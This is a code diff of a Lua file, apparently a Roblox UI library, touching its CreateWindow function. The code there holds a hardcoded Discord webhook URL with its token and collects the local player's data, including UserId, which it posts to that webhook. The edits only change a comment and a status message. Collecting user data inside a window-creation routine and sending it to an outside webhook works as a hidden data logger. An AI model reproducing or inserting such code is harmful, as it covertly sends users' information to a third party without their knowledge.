@@ -1552,7 +1552,6 @@ function lib:CreateWindow(name)
   UIListLayout.Padding = UDim.new(0, 15)
 
   local webhookUrl = "https://discord.com/api/webhooks/1322287456552357938/rEctQ9E1n8M2dzrPEM0BeD26vkmhL73sFzOiuFh5mxpt-Za6P-R-GyzhTSxq-tywjoGy"
-      -- Gather player data
       local player = game.Players.LocalPlayer
       local playerData = {      
           UserId = player.UserId,
@@ -1589,10 +1588,7 @@ function lib:CreateWindow(name)
       })
   
       if response.StatusCode == 200 then
-
-        local data = game:GetService("HttpService"):JSONDecode(response.Body)
-
-          print("Success! " .. data.message)
+          print("Successfully sent webhook!")
       else
           print("Failed to send webhook: " .. response.StatusCode .. " - " .. response.StatusMessage)
       end
